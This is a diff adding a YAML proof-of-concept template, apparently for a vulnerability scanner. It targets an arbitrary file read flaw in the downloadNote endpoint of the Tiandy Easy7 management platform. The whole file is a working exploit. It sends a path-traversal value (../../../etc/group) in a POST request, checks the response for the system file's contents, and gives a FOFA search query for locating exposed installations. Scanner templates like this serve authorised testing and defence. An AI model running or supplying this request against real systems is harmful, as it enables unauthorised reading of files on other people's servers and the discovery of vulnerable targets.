@@ -1,0 +1,18 @@
+id: poc-yaml-tiandy-easy7-imp-downloadnote-anyfile-read
+info:
+  name: 天地伟业Easy7综合管理平台 downloadNote 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Easy7综合管理平台
+  fofa: app="Tiandy-Easy7"
+requests:
+- method: POST
+  path: /Easy7/rest/file/downloadNote
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: fullName=1.png&fileName=../../../etc/group
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"bin:")
+    && !contains(body,"<") && contains(headers,"filename=1.png.doc")
+variables: {}
+transport: http
